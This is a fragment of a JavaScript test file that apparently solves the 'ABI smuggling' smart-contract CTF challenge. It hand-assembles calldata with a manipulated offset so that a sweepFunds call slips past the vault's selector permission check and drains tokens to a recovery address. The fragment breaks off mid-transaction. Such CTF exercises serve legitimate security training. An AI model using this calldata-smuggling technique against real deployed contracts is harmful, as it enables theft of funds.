...
describe('[Challenge] ABI smuggling', function () {
    ...
    it('Execution', async function () {
        ...
        let p2 = abi.encode(["address","uint256"],[vault.address,100]);
        let p3 =ethers.utils.hexZeroPad("0x0",32);
        let p4 = "0xd9caed12";
        let p5 = abi.encode(["uint256"],[68]);
        console.log("----------");
        abi1 = ["function sweepFunds(address,address)"];
        iface = new ethers.utils.Interface(abi1);
        let p6 = iface.encodeFunctionData("sweepFunds",[recovery.address,token.address,]);
        let p = ethers.utils.hexConcat([p1,p2,p3,p4,p5,p6]);
        let tx = {
            from:player.address,
            to:vault.address,
            data:p,
